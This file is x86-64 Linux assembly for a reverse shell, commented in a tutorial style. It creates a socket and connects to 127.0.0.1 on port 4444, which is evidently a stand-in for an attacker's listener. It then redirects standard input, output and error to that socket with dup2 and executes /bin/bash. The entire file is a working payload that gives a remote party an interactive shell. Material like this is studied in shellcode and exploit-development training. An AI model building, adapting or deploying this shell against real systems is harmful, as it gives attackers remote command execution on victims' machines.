global _start

section .data
    shell: db "/bin/bash",0 ;define our shell here

section .text
_start:

    ;cleaning registers
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx

    ;calling socket syscall
    mov rax, 0x29
    mov rdi, 2 ; AF_INET
    mov rsi, 1 ;
    mov rdx, 0
    syscall

    mov rdi, rax ;set socketid to rdi

    ;connect syscall to connect to a socket
    xor rax, rax
    mov rax, 0x2a
    ;rdi is already the pointer to the socket so we dont pass it here
    ;pass the struct here
    xor rsi, rsi
    push rsi
    push 0x0100007f ;push 127.0.0.1 (byte for byte)
    push word 0x5c11 ;push port 4444 here (0x5c11 --> 4444)
    push word 0x02 ;AF_INET value (For communicating between processes on different hosts connected by IPV4, we use AF_INET)
    mov rsi, rsp ;set rsi to our struct (stack pointer)
    mov rdx, 16 ;size of our struct
    syscall

    xor rdx, rdx
    ;exec dup2
_changestd:
    mov rax, 0x21
    ;rdi already is socket id
    mov rsi, rdx
    syscall ;redirect file descriptors to the socket using dup2 syscall
    inc rdx
    cmp rdx, 3
    je _execbash ;if all file descriptors were redirect (0,1,2), jump to execute /bin/bash
    jmp _changestd 

_execbash: ;here we execute our /bin/bash. All inpuit/output will be redirected to the socket
    mov rax, 0x3b
    mov rdi, shell
    xor rsi, rsi
    xor rdx, rdx
    syscall
